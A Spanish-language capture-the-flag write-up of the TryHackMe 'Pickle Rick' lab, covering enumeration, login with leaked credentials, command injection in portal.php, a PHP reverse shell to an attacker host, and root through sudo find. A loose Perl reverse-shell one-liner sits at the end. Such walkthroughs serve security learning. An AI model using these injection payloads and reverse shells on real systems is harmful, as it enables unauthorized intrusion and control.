# >_ [Pickle Rick]

| Propiedad | Detalle |
| :--- | :--- |
| **Plataforma** | TryHackMe |
| **Dificultad** | 🟢 Fácil  |
| **OS** | Linux  |
| **IP de la Máquina** | `10.128.161.94` |
| **Fecha de resolución** | 2026-10-12 |

---

## 📝 Descripción
Máquina enfocada en la explotación de un servicio web vulnerable y posterior escalada de privilegios mediante abuso de permisos SUDO.

---

## 🔍 1. Fase de Reconocimiento y Enumeración


### Escaneo de Puertos (`nmap`)
Lanzamos un escaneo inicial para identificar los puertos abiertos y los servicios activos en la máquina objetivo:

```bash
 nmap -p- --open -n -Pn `10.128.161.94
```

**Resultados del escaneo:**
* **Puerto 22/TCP**: SSH
* **Puerto 80/TCP**: HTTP (Apache)

<img width="646" height="215" alt="1escaneoinicial" src="https://github.com/user-attachments/assets/72681f08-bbdc-4e47-be3f-f4acc2ec4261" />
<br><br>

### Enumeración de servicios
Continuamos con un escaneo más profundo del servicio encontrado:

```bash
nmap -p 22,80 -sCV -n 10.128.161.94
```

<img width="866" height="374" alt="2escaneopuertos" src="https://github.com/user-attachments/assets/b1d3344c-f1f4-46bf-864d-81eb6f852257" />

<br><br>


### Enumeración Web (Puerto 80)

Al inspeccionar el sitio web, nos encontramos con una página para ayudar a Morty, vamos a mirar el código fuente.
<img width="1092" height="746" alt="3web" src="https://github.com/user-attachments/assets/9df2629f-f566-4189-bc5a-182fb6295750" />
<br><br>

Hay un nombre de usuario en un comentario del código html de la web, nos lo guardamos y vamos a realizar enumeraremos con gobuster.
<img width="1091" height="725" alt="4" src="https://github.com/user-attachments/assets/99128df5-83ee-46a9-98c5-4031be3f4a73" />
<br><br>

** Username: R1ckRul3s**


Aplicamos fuzzing de directorios para buscar rutas ocultas:
```bash
gobuster dir -u http://10.128.161.94 -w /usr/share/wordlists/rockyou.txt -x php,txt,html -t 100 -k -r
```
<img width="1149" height="571" alt="5enumweb" src="https://github.com/user-attachments/assets/e67acb86-8a85-4b24-8e07-286ff539f8e6" />
<br><br>

Encontramos unas rutas interesantes: login.php robots.txt y portal.php , así que vamos a mirar que hay y ver si podemos explotarlo.
<br><br>

---

## 💥 2. Fase de Explotación (Acceso Inicial)

Comenzamos entrando a login.php, aquí nos pide un usuario y una contraseña, el usuario lo tenemos porque anteriormente estaba escrito en un comentario de la página web principal, pero la contraseña no, así que vamos a ver otra página de las descubiertas.
<img width="1831" height="825" alt="6" src="https://github.com/user-attachments/assets/cd3b50cd-96e0-4711-b75d-a6b00799e194" />

En robots.txt solo hay una palabra que parece una contraseña, podríamos probarla junto con el usuario que descubrimos en la página de login.
<img width="1124" height="425" alt="7" src="https://github.com/user-attachments/assets/2b5c1a07-3cca-4cdc-ae79-71272861bf98" />
<br><br>


### Vector de Ataque
Escribimos el usuario y la contraseña encontrados y estamos dentro, vemos que es portal.php, una de las rutas que encontramos previamente pero a la que no podíamos acceder antes.
<img width="1682" height="505" alt="8dentro" src="https://github.com/user-attachments/assets/b1369a21-b7a3-41cb-bec4-da1599394d7d" />
SEGUIR 8 subida

```bash
127.0.0.1 ; ls -la
```


<br><br>

Nos muestra el ping y debajo nos ha ejecutado el **ls -la** que pusimos, por lo que es vulnerable. 
Hay inyección de comandos, por lo que podemos mirar archivos como el usuario web-admin, ya que haciendo un whoami nos dijo que somos ese usuario.



<br><br>
Entramos al directorio del usuario....

```bash
127.0.0.1 ;  cat /home/web-admin/user.txt
```

<img width="1506" height="885" alt="7flagusuario" src="https://github.com/user-attachments/assets/c1d26f07-a1b5-41f8-bbe6-8358db60f015" />
<br><br>

La flag es correcta, vamos a continuar obtenido una consola más interactiva para poder escalar privilegios más facilmente.


<img width="988" height="518" alt="8flag" src="https://github.com/user-attachments/assets/cf806bdf-c760-4547-8e9a-85f08d76a89a" />
<br><br>


### Intrusión (Reverse Shell)
Logramos ejecutar comandos en el sistema y establecemos una *reverse shell* hacia nuestra máquina atacante:

```php
# Comando ejecutado en el navegador web
127.0.0.1; php -r '$sock=fsockopen("172.17.0.1",440);exec("/bin/bash <&3 >&3 2>&3");'
```

<img width="1372" height="821" alt="9revelsehell" src="https://github.com/user-attachments/assets/9bb10cb9-70d3-4eb2-a2d6-64e762e2ec23" />
<br><br>


Ponemos nuestro *netcat* a la escucha para recibir la conexión:
```bash
sudo nc -lvnp 440
```

<img width="978" height="307" alt="10recibida" src="https://github.com/user-attachments/assets/f5b44944-fba7-4f5f-a727-f65fb4943e64" />
<br><br>

Ya somos el usuario web-admin desde una terminal, ahora podemos sanitizarla o continuar así, se ve peor pero como anteriormente vimos que con sudo -l podíamos ejecutar find sin contraseña como el usuario root, vamos a escalar privilegios.

```bash
# Tratamiento de  la TTY para tener una consola interactiva cómoda
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
```


## 👑 3. Escalada de Privilegios

### Enumeración del Sistema

```bash
# Comprobamos privilegios de SUDO
sudo -l
```
---

### Explotación del Vector de Escalada

Nos aprovechamos del permiso SUID que tenemos para ejecutar find sin contraseña y como el usuario root para convertirnos en él.

```bash
sudo find . -exec /bin/sh \; -quit
```

<img width="991" height="428" alt="11root" src="https://github.com/user-attachments/assets/856ffe1c-6d52-4d25-88f3-c5de7978d181" />
<br><br>


¡Ya somos **root**! 🚩 Buscamos la flag en la carpeta personal de root.

<img width="1086" height="181" alt="12flag2" src="https://github.com/user-attachments/assets/6bf0cbce-83f4-4349-951a-ecf3790287f7" />
<br><br>

Por último, validamos la flag obtenida.
<img width="992" height="691" alt="Finaaal" src="https://github.com/user-attachments/assets/b42ae430-6909-416c-89e2-60fd0f683364" />






perl -e 'use Socket;$i="10.128.173.235";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'



